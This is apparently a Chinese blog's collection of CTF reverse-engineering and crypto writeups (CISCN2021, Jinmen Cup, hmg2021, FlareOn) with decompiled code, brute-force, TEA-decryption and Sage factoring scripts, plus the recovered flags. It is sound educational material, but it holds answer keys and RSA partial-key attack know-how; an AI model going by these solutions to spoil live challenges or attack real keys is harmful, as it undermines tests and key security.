做这道题的时候，最大的问题就是没有搜索足够的资料，如果第一步想出来的话的，以比赛的时间，应该还是有机会做出来这道题的，毕竟后续的工作都是体力活，一点一点做下去应该就差不多能出来了\n不过不管怎么说，补题的过程还是学到了很多东西的，比如“病毒式”混淆可以直接用输出来解，brainfuck的小型解释器怎么看，以及最后直接输出索引地址，做题经验++\nHMI 先说结论：屑题\n参考了这篇博客：https://myts2.cn/2021/05/16/ciscn2021/\n逆向分析 用 file 命令看一眼，发现全是 .NET，直接上 dnSpy\n先搜索 CISCN 字符串，找到最后的验证和输出\nchecked { while (!string.IsNullOrEmpty(AnalogValueDisplay.combined[num4])) { num4++; if (num4 \u0026gt; 7) { IL_1B9: if (num3 == 0) { string hash = AnalogValueDisplay.GetHash(string.Join(\u0026#34;,\u0026#34;, AnalogValueDisplay.combined)); Console.WriteLine(\u0026#34;Booooooooooooooooom!\u0026#34;); if (Operators.CompareString(hash.Substring(0, 10), \u0026#34;F0B278CCB9\u0026#34;, false) == 0) { Console.WriteLine(\u0026#34;CISCN{\u0026#34; + hash + \u0026#34;}\u0026#34;); } } return; } } num3 = 1; goto IL_1B9; } 所以最后需要通过一个md5验证，然后往回找 combined 是什么，发现是从 text 赋值的\n而具体赋值到哪里，则是由 num2 决定的， num2 是一串 41047 - 41054 的字符串\n比赛的时候只知道这个是一个端口，但具体是什么没搞出来，疯狂往回找引用发现找不到东西，怀疑还是需要远程往里面打数据，因此尝试搭建GRFICS的平台（队内大佬找到的），最后熬不动放弃了\n参考别人的wp之后发现需要使用 Modbus Slave 往里面打数据，开始补题\nModbus Slave调试 之前找到的 401** 原来就是 Modbus 的端口，所以只需要用 Modbus Slave 往相应端口添加数据就行\n先直接运行找到粗略的范围（调试修改数据太慢了），目标就是让数字都变成白色\n在粗查的时候就能发现小数点后有一些位置在 exe 界面是看不到的\n明确范围后进 dnSpy 调试，总结出一个表格\n    min  max  dif combined i     $41046$ $52.8016$ $17312$ $52.8992$ $17344$ $0.00305$ $0.00305$ $2$   $41047$ $25.0002$ $1634$ $25.092$ $1640$ $0.0153$ $0.0153$ $1$   $41048$ $62.10105$ $20361$ $62.19865$ $20393$ $0.00305$ $0.00305$ $0$   $41049$ $406.6128$ $26576$ $406.6893$ $26581$ $0.0153$ $0.0153$ $3$   $41050$ $54.00025$ $17705$ $54.09785$ $17737$ $0.00305$ $0.00305$ $7$   $41051$ $158.0031$ $10327$ $158.0949$ $10333$ $0.0153$ $0.0153$ $6$   $41052$ $22.0027$ $7214$ $22.09725$ $7245$ $0.00305$ $0.00305$ $4$   $41053$ $13.1121$ $857$ $13.1886$ $862$ $0.0153$ $0.0153$ $5$    接下来在这一范围内进行爆破就好了\n对范围做了个计算，我搞出来的是 2028571776，不知道为什么参考比我这个小一点\n爆破 因为最后要算 md5，所以精度不能有问题，又因为爆破范围大概在 20 亿左右，所以速度也不能慢\n于是决定先用python的Decimal来算小数，再用cpp求解\nfrom decimal import Decimal min = [52.8016, 25.0002, 62.10105, 406.6128, 54.00025, 158.0031, 22.0027, 13.1121] max = [52.8992, 25.092, 62.19865, 406.6893, 54.09785, 158.0949, 22.09725, 13.1886] dif = [0.00305, 0.0153, 0.00305, 0.0153, 0.00305, 0.0153, 0.00305, 0.0153] round = [33, 7, 33, 6, 33, 7, 32, 6] for i in range(8): min[i] = str(min[i]) max[i] = str(max[i]) dif[i] = str(dif[i]) res = min[i] for _ in range(round[i]): print (res, end = \u0026#39;, \u0026#39;) res = Decimal(res) + Decimal(dif[i]) print () 最后算出来的结尾会有0，手动去除一下就行\n然后用cpp进行爆破，这里写的比较懒\n#pragma GCC optimize(3) #include \u0026lt;bits/stdc++.h\u0026gt;#include \u0026lt;openssl/md5.h\u0026gt; using namespace std; string combine[8][40] = { {\u0026#34;62.10105\u0026#34;, \u0026#34;62.1041\u0026#34;, \u0026#34;62.10715\u0026#34;, \u0026#34;62.1102\u0026#34;, \u0026#34;62.11325\u0026#34;, \u0026#34;62.1163\u0026#34;, \u0026#34;62.11935\u0026#34;, \u0026#34;62.1224\u0026#34;, \u0026#34;62.12545\u0026#34;, \u0026#34;62.1285\u0026#34;, \u0026#34;62.13155\u0026#34;, \u0026#34;62.1346\u0026#34;, \u0026#34;62.13765\u0026#34;, \u0026#34;62.1407\u0026#34;, \u0026#34;62.14375\u0026#34;, \u0026#34;62.1468\u0026#34;, \u0026#34;62.14985\u0026#34;, \u0026#34;62.1529\u0026#34;, \u0026#34;62.15595\u0026#34;, \u0026#34;62.1590\u0026#34;, \u0026#34;62.16205\u0026#34;, \u0026#34;62.1651\u0026#34;, \u0026#34;62.16815\u0026#34;, \u0026#34;62.1712\u0026#34;, \u0026#34;62.17425\u0026#34;, \u0026#34;62.1773\u0026#34;, \u0026#34;62.18035\u0026#34;, \u0026#34;62.1834\u0026#34;, \u0026#34;62.18645\u0026#34;, \u0026#34;62.1895\u0026#34;, \u0026#34;62.19255\u0026#34;, \u0026#34;62.1956\u0026#34;, \u0026#34;62.19865\u0026#34;}, {\u0026#34;25.0002\u0026#34;, \u0026#34;25.0155\u0026#34;, \u0026#34;25.0308\u0026#34;, \u0026#34;25.0461\u0026#34;, \u0026#34;25.0614\u0026#34;, \u0026#34;25.0767\u0026#34;, \u0026#34;25.092\u0026#34;}, {\u0026#34;52.8016\u0026#34;, \u0026#34;52.80465\u0026#34;, \u0026#34;52.8077\u0026#34;, \u0026#34;52.81075\u0026#34;, \u0026#34;52.8138\u0026#34;, \u0026#34;52.81685\u0026#34;, \u0026#34;52.8199\u0026#34;, \u0026#34;52.82295\u0026#34;, \u0026#34;52.8260\u0026#34;, \u0026#34;52.82905\u0026#34;, \u0026#34;52.8321\u0026#34;, \u0026#34;52.83515\u0026#34;, \u0026#34;52.8382\u0026#34;, \u0026#34;52.84125\u0026#34;, \u0026#34;52.8443\u0026#34;, \u0026#34;52.84735\u0026#34;, \u0026#34;52.8504\u0026#34;, \u0026#34;52.85345\u0026#34;, \u0026#34;52.8565\u0026#34;, \u0026#34;52.85955\u0026#34;, \u0026#34;52.8626\u0026#34;, \u0026#34;52.86565\u0026#34;, \u0026#34;52.8687\u0026#34;, \u0026#34;52.87175\u0026#34;, \u0026#34;52.8748\u0026#34;, \u0026#34;52.87785\u0026#34;, \u0026#34;52.8809\u0026#34;, \u0026#34;52.88395\u0026#34;, \u0026#34;52.8870\u0026#34;, \u0026#34;52.89005\u0026#34;, \u0026#34;52.8931\u0026#34;, \u0026#34;52.89615\u0026#34;, \u0026#34;52.8992\u0026#34;}, {\u0026#34;406.6128\u0026#34;, \u0026#34;406.6281\u0026#34;, \u0026#34;406.6434\u0026#34;, \u0026#34;406.6587\u0026#34;, \u0026#34;406.674\u0026#34;, \u0026#34;406.6893\u0026#34;}, {\u0026#34;22.0027\u0026#34;, \u0026#34;22.00575\u0026#34;, \u0026#34;22.0088\u0026#34;, \u0026#34;22.01185\u0026#34;, \u0026#34;22.0149\u0026#34;, \u0026#34;22.01795\u0026#34;, \u0026#34;22.0210\u0026#34;, \u0026#34;22.02405\u0026#34;, \u0026#34;22.0271\u0026#34;, \u0026#34;22.03015\u0026#34;, \u0026#34;22.0332\u0026#34;, \u0026#34;22.03625\u0026#34;, \u0026#34;22.0393\u0026#34;, \u0026#34;22.04235\u0026#34;, \u0026#34;22.0454\u0026#34;, \u0026#34;22.04845\u0026#34;, \u0026#34;22.0515\u0026#34;, \u0026#34;22.05455\u0026#34;, \u0026#34;22.0576\u0026#34;, \u0026#34;22.06065\u0026#34;, \u0026#34;22.0637\u0026#34;, \u0026#34;22.06675\u0026#34;, \u0026#34;22.0698\u0026#34;, \u0026#34;22.07285\u0026#34;, \u0026#34;22.0759\u0026#34;, \u0026#34;22.07895\u0026#34;, \u0026#34;22.0820\u0026#34;, \u0026#34;22.08505\u0026#34;, \u0026#34;22.0881\u0026#34;, \u0026#34;22.09115\u0026#34;, \u0026#34;22.0942\u0026#34;, \u0026#34;22.09725\u0026#34;}, {\u0026#34;13.1121\u0026#34;, \u0026#34;13.1274\u0026#34;, \u0026#34;13.1427\u0026#34;, \u0026#34;13.158\u0026#34;, \u0026#34;13.1733\u0026#34;, \u0026#34;13.1886\u0026#34;}, {\u0026#34;158.0031\u0026#34;, \u0026#34;158.0184\u0026#34;, \u0026#34;158.0337\u0026#34;, \u0026#34;158.049\u0026#34;, \u0026#34;158.0643\u0026#34;, \u0026#34;158.0796\u0026#34;, \u0026#34;158.0949\u0026#34;}, {\u0026#34;54.00025\u0026#34;, \u0026#34;54.0033\u0026#34;, \u0026#34;54.00635\u0026#34;, \u0026#34;54.0094\u0026#34;, \u0026#34;54.01245\u0026#34;, \u0026#34;54.0155\u0026#34;, \u0026#34;54.01855\u0026#34;, \u0026#34;54.0216\u0026#34;, \u0026#34;54.02465\u0026#34;, \u0026#34;54.0277\u0026#34;, \u0026#34;54.03075\u0026#34;, \u0026#34;54.0338\u0026#34;, \u0026#34;54.03685\u0026#34;, \u0026#34;54.0399\u0026#34;, \u0026#34;54.04295\u0026#34;, \u0026#34;54.0460\u0026#34;, \u0026#34;54.04905\u0026#34;, \u0026#34;54.0521\u0026#34;, \u0026#34;54.05515\u0026#34;, \u0026#34;54.0582\u0026#34;, \u0026#34;54.06125\u0026#34;, \u0026#34;54.0643\u0026#34;, \u0026#34;54.06735\u0026#34;, \u0026#34;54.0704\u0026#34;, \u0026#34;54.07345\u0026#34;, \u0026#34;54.0765\u0026#34;, \u0026#34;54.07955\u0026#34;, \u0026#34;54.0826\u0026#34;, \u0026#34;54.08565\u0026#34;, \u0026#34;54.0887\u0026#34;, \u0026#34;54.09175\u0026#34;, \u0026#34;54.0948\u0026#34;, \u0026#34;54.09785\u0026#34;}, }; int size[8] = {33, 7, 33, 6, 32, 6, 7, 33}; string MD5(const string\u0026amp; src ) { MD5_CTX ctx; string md5_string; unsigned char md[16] = { 0 }; char tmp[33] = { 0 }; MD5_Init( \u0026amp;ctx ); MD5_Update( \u0026amp;ctx, src.c_str(), src.size() ); MD5_Final( md, \u0026amp;ctx ); for( int i = 0; i \u0026lt; 16; ++i ) { memset( tmp, 0x00, sizeof( tmp ) ); sprintf( tmp, \u0026#34;%02X\u0026#34;, md[i] ); md5_string += tmp; } return md5_string; } int main(){ cout \u0026lt;\u0026lt; MD5(\u0026#34;62.10105,25.0002,52.8016,406.6128,22.0027,13.1121,158.0031,54.00025,\u0026#34;) \u0026lt;\u0026lt; endl; int cur[8] = {}; time_t start = clock(); for (long long i = 0; i \u0026lt; 2028571776; ++i){ string in = \u0026#34;\u0026#34;; for (int j = 0; j \u0026lt; 8; ++j){ if (cur[j] \u0026gt;= size[j]){ cur[j] = 0; ++cur[j + 1]; } in += combine[j][cur[j]]; in += \u0026#34;,\u0026#34;; } string out = MD5(in); cur[0] += 1; // cout \u0026lt;\u0026lt; in \u0026lt;\u0026lt; endl;  if (out[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; out[1] == \u0026#39;0\u0026#39; \u0026amp;\u0026amp; out[2] == \u0026#39;B\u0026#39; \u0026amp;\u0026amp; out[3] == \u0026#39;2\u0026#39; \u0026amp;\u0026amp; out[4] == \u0026#39;7\u0026#39; \u0026amp;\u0026amp; out[5] == \u0026#39;8\u0026#39; \u0026amp;\u0026amp; out[6] == \u0026#39;C\u0026#39; \u0026amp;\u0026amp; out[7] == \u0026#39;C\u0026#39; \u0026amp;\u0026amp; out[8] == \u0026#39;B\u0026#39; \u0026amp;\u0026amp; out[9] == \u0026#39;9\u0026#39;){ cout \u0026lt;\u0026lt; \u0026#34;in:\u0026#34; \u0026lt;\u0026lt; in \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;out:\u0026#34; \u0026lt;\u0026lt; out \u0026lt;\u0026lt; endl; } if (i % 5000000 == 0) cout \u0026lt;\u0026lt; 100.0 * i / 2028571776 \u0026lt;\u0026lt; \u0026#34;%\u0026#34; \u0026lt;\u0026lt; endl; } time_t end = clock(); printf(\u0026#34;time=%fs\\n\u0026#34;, (double)(end - start)/CLOCKS_PER_SEC); return 0; } md5是直接上网抄的，来源：https://blog.csdn.net/u012063703/article/details/49178349\n最后的结果\n... 60.8803% in:62.1834,25.0002,52.84735,406.6893,22.01795,13.1886,158.0031,54.06125, out:F0B278CCB982F6132DD6A834C4827D0D 61.1268% ... time=2639.569345s 爆破出答案大概花了 $60% \\times 2640=26.4\\min$\n结论 这题难度不在于逆向，前期的基本分析以及后面需要打数据动调这些和逆向有关的操作，比赛的时候其实都想到了，但问题在于不知道还有 Modbus Slave 这种东西\n所以全程都很迷茫，完全不知道该怎么做，官方的提示早上才放出来，那会都收工准备补觉了（一个小时的时间，找数据范围+写脚本+爆破，根本来不及好吧）\n以及过程中的调数据就是无限二分，累的一批，这题说是 Misc 我都信\n最后的爆破数据量也太大了，参考的博客用go跑了两小时，我这边用c++跑了半个小时，不过队友用c的多线程只跑了半分钟，看截图只爆破了 $2%$ 就出结果了，应该是划分的位置正好在答案边上，有时间学习一下多线程\n综上：屑题\ngift 新版本的GO对magic number以及一些结构上都做了修改，所以老版本的符号表修复脚本就不能用了，好在免费的ida7.6正好支持GO的符号表恢复，可以直接做了。\n主函数主要部分如下\nmain_CISCN6666666(); main_CISCN66666666(); main_CISCN6666666666(); max_len_v2 = qword_928238; // 0x20  index_v3 = 0LL; while ( (__int64)index_v3 \u0026lt; max_len_v2 ) { qword_9720E8 = 0LL; if ( qword_928238 \u0026lt;= index_v3 ) runtime_panicIndex(); v14 = off_928230[index_v3]; runtime_makeslice((__int64)\u0026#34;\\b\u0026#34;, v14, v14, v10); v5 = (__int64 *)v11; v19 = (__int64 *)v11; v4 = 1LL; while ( v4 \u0026lt;= 4 ) { v12 = v4; main_wtf(0LL, v4, v5, v14, v14); v4 = v12 + 1; v5 = v19; } if ( (unsigned __int64)qword_9720E8 \u0026gt;= 0x11 ) runtime_panicIndex(); v6 = *((_BYTE *)\u0026amp;v16 + qword_9720E8); v22[0] = \u0026amp;unk_8765E0; // output_length  v22[1] = \u0026amp;qword_9239C0[v6 ^ 0x66u]; // output  v8 = qword_92EAB0; v10 = 2LL; v1 = v22; fmt_Fprintf(v0, (__int64)v22, (const char *)qword_9239C0); index_v3 += 1; } 开头的三个CISCN函数是简单的输出，中间生成空的slice然后扔到了wtf函数中，输出是根据索引，从qword_9239C0中选择一个字符。\n尝试运行的时候发现运行时间很长，但在程序中没有看到延时的操作，那么这道题应该是一个耗时的算法。\n观察发现 wtf 函数是一个递归函数，而 off_928230 中存的就是递归的深度。\n尝试找规律，直接将深度patch成 1 到 0x20，运行一下。\n得到如下结果\nWelcome to CISCN 2021! Here is our free flag for you as a gift: CISCN{45b3247c45b3247c4 猜测最后的输出是有规律的\ncur_time = [ 1, 3, 6, 9, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x14, 0x19, 0x1E, 0x28, 0x42, 0x66, 0x0A0, 0x936, 0x3D21, 0x149A7, 0x243AC, 0x0CB5BE, 0x47DC61, 0x16C0F46, 0x262C432, 0x4ACE299, 0x10FBC92A, 0x329ECDFD, 0x370D7470 ] res = [\u0026#39;c\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;7\u0026#39;] print (\u0026#39;CISCN{\u0026#39;, end = \u0026#39;\u0026#39;) for c in cur_time: print (res[c % len(res)], end = \u0026#39;\u0026#39;) print (\u0026#39;}\u0026#39;) print (\u0026#39;CISCN{4b445b3247c45344c54c44734445452c}\u0026#39;) 和最后的正确结果做个对比，发现一样。\n","date":"2021-05-20T01:21:59Z","permalink":"/post/ciscn2021-re-writeup/","title":"CISCN2021 RE writeup"},{"content":"和两位学长一起做出来的，总算是能在团队赛中做出来题了，结束了长达一个月的白给生涯，不容易啊\n思路 先拖到 ida 里进行静态分析\n查看main函数，把变量定义和初始化删了，并将 cin 的东西命名为了 input\n__int64 __fastcall main(int a1, char **a2, char **a3) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;\u0026gt;\u0026gt; \u0026#34;, a3); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, input); if ( strlen(input) == 64 ) { v3 = input; v4 = \u0026amp;unk_55A06D2D0020; v5 = 0LL; do { v6 = hexstr2int(v3, 8); v7 = v14; sub_55A06D2CC408(\u0026amp;v14[v5], v6); sub_55A06D2CC408(\u0026amp;v18[v5], 17); v8 = v19; sub_55A06D2CC408(\u0026amp;v19[v5], *v4); ++v3; ++v4; v5 += 36LL; } while ( v3 != v21 ); sub_55A06D2CCB30(v14, v18, v9); sub_55A06D2CCB30(v15, v18, v10); sub_55A06D2CCB30(v16, v18, v11); sub_55A06D2CCB30(v17, v18, v12); while ( !sub_55A06D2CCADC(v7, v8) ) { v7 += 36; v8 += 36; if ( v7 == v18 ) { __printf_chk(1LL, \u0026#34;flag{%s}\\n\u0026#34;, input); return 0LL; } } puts(\u0026#34;error\u0026#34;); } else { puts(\u0026#34;error\u0026#34;); } return 0LL; } 简单查看一下，发现输入长度为64，然后 do while 看起来是进行初始化，后面的四个连续函数应该是加密\n同时确定这个应该是算法题，不涉及混淆之类的东西\n于是查看一下 v6= 的那个函数\n__int64 __fastcall hexstr2int(_BYTE *a1, int a2) { v2 = strlen(a0123456789abcd) + 1; // 17  if ( a2 \u0026lt;= 0 ) return 0LL; v3 = v2 - 1; v4 = a1; LODWORD(result) = 0; while ( 1 ) { if ( v3 \u0026lt;= 0 ) return 0LL; for ( i = 0LL; a0123456789abcd[i] != *v4; ++i ) {// input是0-f  if ( i == v2 - 2 ) return 0LL; } if ( v3 \u0026lt;= i ) break; result = (i + (v2 - 1) * result); // input转成int  if ( ++v4 == \u0026amp;a1[a2 - 1 + 1] ) return result; } return 0LL; } 发现应该是将输入转换成了 int，而且输入的字符必须得在 0123456789ABCDEF 中\n然后看一眼重复出现三次的 sub_55A06D2CCB30 函数\n__int64 __fastcall sub_55A06D2CC408(__int64 a1, int a2) { *(a1 + 8) = 0; *(a1 + 4) = a2; v2 = 4LL; while ( 1 ) { v3 = v2 - 1; if ( *(a1 + v2 + 3) ) break; if ( !--v2 ) goto LABEL_4; } v3 = v2; LABEL_4: *a1 = v3; return v3; } 看起来就是简单的赋值，a1 的第一部分填写长度，第二部分存 a2\n初始化部分应该可以先不管了，去看加密函数\nunsigned __int64 __fastcall sub_55A06D2CCB30(__int64 a1, __int64 a2, __int64 a3) { sub_55A06D2CCA13(v5, a1); sub_55A06D2CCA13(v6, (a1 + 36)); sub_55A06D2CC408(v7, 0); sub_55A06D2CC408(v8, 0x830A5376); sub_55A06D2CC408(v9, 0x1D3D2ACF); sub_55A06D2CC667(v10, v9, v8); // v10=delta=0x9e3779b9  sub_55A06D2CCA13(v11, a2); sub_55A06D2CCA13(v12, (a2 + 36)); sub_55A06D2CCA13(v13, (a2 + 72)); sub_55A06D2CCA13(v14, (a2 + 108)); v3 = 32; do { sub_55A06D2CC2E9(v7, v7, v10); // sum+=delta  left_rot(v15, v6, 4); sub_55A06D2CC2E9(v15, v15, v11); // v15+v11  sub_55A06D2CC2E9(v16, v6, v7); // sum+plain  right_rot(v17, v6, 5); sub_55A06D2CC2E9(v17, v17, v12); // key+plain  sub_55A06D2CC667(v15, v15, v16); sub_55A06D2CC667(v15, v15, v17); sub_55A06D2CC2E9(v5, v5, v15); left_rot(v18, v5, 4); sub_55A06D2CC2E9(v18, v18, v13); sub_55A06D2CC2E9(v19, v5, v7); right_rot(v20, v5, 5); sub_55A06D2CC2E9(v20, v20, v14); sub_55A06D2CC667(v18, v18, v19); sub_55A06D2CC667(v18, v18, v20); sub_55A06D2CC2E9(v6, v6, v18); --v3; } while ( v3 ); sub_55A06D2CCA13(a1, v5); sub_55A06D2CCA13((a1 + 36), v6); return __readfsqword(0x28u) ^ v21; } 一开始看到一大串 sub_ 还以为是 AES 之类的（毕竟之前做过一道类似的），然后看了一下重要的参数\n64bit明文，128bit密钥，32轮加密\n看起来很像tea家族的算法，但不是很确定。因为懒得详细看每个函数了，所以动态调试一下，做个黑盒测试\n调试之后发现 0x830A5376 和 0x1D3D2ACF 其实是用来算 delta 的，算出来 v10=0x9e3779b9，这就肯定是tea家族了\n另外，动调的时候发现这里应该都是用的结构体，所以每个小的加法都是单独的函数给出的，但好像用上的只有结构体的前八个字节，后面的字节有什么用还不太清楚\n然后具体往下看，看到循环中的前几个分别是 sum+=delta，v6\u0026lt;\u0026lt;4，(v6\u0026lt;\u0026lt;4)+k0，sum+p0，v6\u0026gt;\u0026gt;5，k1+p0。和网上的三种 TEA 加密比对了一下，发现竟然就是最简单的 TEA 加密，一开始看这么多函数还以为是 XTEA 呢\n脚本 密钥就是主函数中初始化的几个 0x11，密文就是最后用来 cmp 的字符串（找结构体对应的那个字符数组就行），于是找了个脚本，直接解密\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt; void decrypt(uint32_t* v, uint32_t* k) { uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; uint32_t delta = 0x9e3779b9; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i \u0026lt; 32; i++) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + k2) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + k3); v0 -= ((v1 \u0026lt;\u0026lt; 4) + k0) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + k1); sum -= delta; } v[0] = v0; v[1] = v1; } int main() { uint32_t v[2] = {0x79AE1A3B, 0X596080D3}, k[4] = {17, 17, 17, 17}; decrypt(v, k); printf(\u0026#34;%X%X\u0026#34;, v[0], v[1]); } 把所有密文全扔进去算结果，就能拿到 flag 了\n总结 第一眼看到这个题就感觉能做出来，果然如此\n深刻体会到了动调进行黑盒测试的重要性，可以大幅度加快做题速度，能猜出来就不要花时间看\n其实这题有点可惜，本来能抢到三血的，结果忘了大小写的问题，脚本算出来后本地测试一直是 error，最后还是大佬队友发现的，然后就过了\n","date":"2021-05-10T02:32:59Z","permalink":"/post/jinmen-cup-goodre-writeup/","title":"津门杯 GoodRE writeup"},{"content":"已知一个 $1024$ 位的 $p1$，$p2$ 比 $p1$ 稍小，根据代码知道 $p3\\equiv p2!\\pmod{p1}$\n根据 Wilson 定理，$n$ 为质数时有 $(n-1)!\\equiv -1\\pmod{n}$，所以 $p2! \\prod\\limits_{i=p2+1}^{p1-2}i\\equiv 1\\pmod{p1}$，所以可以计算出 $p2+1$ 乘到 $p1-1$ 的结果，然后取模拟并调用 sympy 库即可得到 $p3$\nimport sympy from libnum import invmod p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031 p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034 res = 1 for i in range(p2 + 1, p1 - 1): res = res * i % p1 res = invmod(res, p1) p3 = sympy.nextprime(res) p = p3 \u0026gt;\u0026gt; 50 \u0026lt;\u0026lt; 50 得到的 $p$ 是最终 RSA 加密用的 $P$ 的高位，因此可以使用 Factoring with High Bits Known 攻击，用 sage 构造如下攻击脚本（网上找的）\np = 0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722c000000000000 N = 0xe27e847b1cece6ad3d8a35c27022d94cc14016f9550d41b87b85f946edf0a1c01d8c79a663244143550cfce88038bf29d65070d021991455e4570ea57ea1effc1cf380d572473dc6ea0dc150c431761181e66c578eaeebf156c445d3b6141dda961aa467f4d2c811859534027e5b9e67eb4db051c82602208cfe92674013aafa5b437ae404876ececc2f453bb16734adccc5fb87b16e980e52484f6b9f4bdeb99f2e7dc606bb65628e3f62c7df11abd553ffc6b95d3dda592fa81df5e584687864de702d10669e3aac75ad9c6284b98b44140f347307243b2485f59fa5c3f0eaeaf0addade803f2f09cd4c77f27d672756b9cc62a6325247d8608390e761dc91 pbits = p.nbits() kbits = 50 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) f = x + p x0 = f.small_roots(X=2^kbits, beta=0.4)[0] print( \u0026#34;x: %s\u0026#34; %hex(int(x0))) p = p+x0 print (\u0026#34;p: \u0026#34;, hex(int(p))) assert N % p == 0 q = N/int(p) print (\u0026#34;q: \u0026#34;, hex(int(q))) 得到 RSA 的 $P$ 和 $Q$，最终构建解密脚本\nfrom libnum import invmod, n2s p = 0xe53f2ea1ce33f589db34b4c25cc9ce4b47cf2cad37e8bb39df1bf014b3f9982cb89d845eff02d167a9a5e979a1fa8f53803cca71aee02f65275b75129e589c6150b6105cdcd7452d6852b1337ad25c9487e944d28e1fcdbf3a655ec56ee15769d08de7c7b3b0d9e410b6155081062cbd679290ab22f838f8722fbcdcffc1a2ef q = 0xfced19c7532be88658aaa5e9566f5274b9aefa4c5d21582a24cc48c70b5e3c05c17eb6f85b4732d57bdc0288d1f548b92f4f13a6f7b07d07a01173cefb06fb8f2e3591e5d518d1584a8e27331a4e769eae98537fe1fb380ee804574d98188a4c327c8a1d180ee44b9148d63a07216b40e711970c9f1ea097bfbecfc3b52e787f phi_n = (p - 1) * (q - 1) print (n2s(c, invmod(e, phi_n), N)) # flag{w0_x1hu1n_y0u_b5st} ","date":"2021-04-13T21:39:43Z","permalink":"/post/hmg2021-rsa-attack-writeup/","title":"hmg2021 RSA Attack writeup"},{"content":"Chanllenge1 一个修改了 table 的 Base64\nimport base64 import string fake_base = \u0026#39;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\u0026#39; true_base = string.ascii_uppercase + string.ascii_lowercase + string.digits + \u0026#39;+/\u0026#39; cipher = \u0026#39;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\u0026#39; good_cipher = \u0026#39;\u0026#39; for c in cipher: good_cipher += true_base[fake_base.index(c)] print (good_cipher) print (base64.b64decode(good_cipher)) Bob Doge 先运行测试一下，发现点击 Decode 之后是乱码\n用 dnSpy 打开，找到 Main 函数\nprivate static void Main() { Application.EnableVisualStyles(); Application.SetCompatibleTextRenderingDefault(false); Application.Run(new Form1()); } 发现只新建了一个 Form1\n进入 Form1，找到带有 Click 的函数\nprivate void btnDecode_Click(object sender, EventArgs e) { this.pbRoge.Image = Resources.bob_roge; byte[] dat_secret = Resources.dat_secret; string text = \u0026#34;\u0026#34;; foreach (byte b in dat_secret) { text += (char)((b \u0026gt;\u0026gt; 4 | ((int)b \u0026lt;\u0026lt; 4 \u0026amp; 240)) ^ 41); } text += \u0026#34;\\0\u0026#34;; string text2 = \u0026#34;\u0026#34;; for (int j = 0; j \u0026lt; text.Length; j += 2) { text2 += text[j + 1]; text2 += text[j]; } string text3 = \u0026#34;\u0026#34;; for (int k = 0; k \u0026lt; text2.Length; k++) { char c = text2[k]; text3 += (char)((byte)text2[k] ^ 102); } this.lbl_title.Text = text3; } 发现是从一个 Resources 的地方调用来了一个 dat_secret。但找不到这个地方。\n于是考虑进行动态调试。\n打上断点后调试，点击 Decode 按钮，进入如下页面\n\rflag\r\n一开始以为最后的 text3 是 flag，结果看到 text 变量长得就很好看，符合 FlareOn 的 flag 的特征，于是直接提交试试，发现通过。\nUltimateMinesweeper 运行软件测试一下，发现是一个 $30\\times 30$ 的扫雷，只有三个格子不是雷。\nexeinfo发现是 .NET 文件，因此拖到 dnSpy 中\n由于是面向对象代码，不太好分析，所以进行动态调试，在生成完扫雷界面后停下，查看内存数据，发现在 mineField.MinesPresent 中存有雷的位置。\n\rmineinmemory\r\n先尝试直接手动把雷扔到前三个，然后运行试一下，发现：\n 二元数组是先竖后横 最后出现的结果是乱码  因此简单看一下最后的生成函数\n寻找 SuccessPopup 的调用\n发现 new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog();\n因此找到这个方法\nprivate string GetKey(List\u0026lt;uint\u0026gt; revealedCells) { revealedCells.Sort(); Random random = new Random(Convert.ToInt32(revealedCells[0] \u0026lt;\u0026lt; 20 | revealedCells[1] \u0026lt;\u0026lt; 10 | revealedCells[2])); byte[] array = new byte[32]; byte[] array2 = new byte[] { 245, 75, 65, 142, 68, 71, 100, 185, 74, 127, 62, 130, 231, 129, 254, 243, 28, 58, 103, 179, 60, 91, 195, 215, 102, 145, 154, 27, 57, 231, 241, 86 }; random.NextBytes(array); uint num = 0U; while ((ulong)num \u0026lt; (ulong)((long)array2.Length)) { byte[] array3 = array2; uint num2 = num; array3[(int)num2] = (array3[(int)num2] ^ array[(int)num]); num += 1U; } return Encoding.ASCII.GetString(array2); } 似乎最后的结果和扫雷时点击的位置也有关系，所以不能手动修改雷的位置\n那就找到三个 False 并记录下来即可\n7 20 28 7 24 28 运行并点击这三个位置\n\rwhereismine\r\n最后弹出 flag\n\rthisisflag\r\n[FlareOn1]Javascrap 一开始盯着网页看了半天，找不到题目在哪儿，就看了眼别人的wp，发现文件就在图片里\n用010editor打开，找到php文件，导出\n\u0026lt;?php 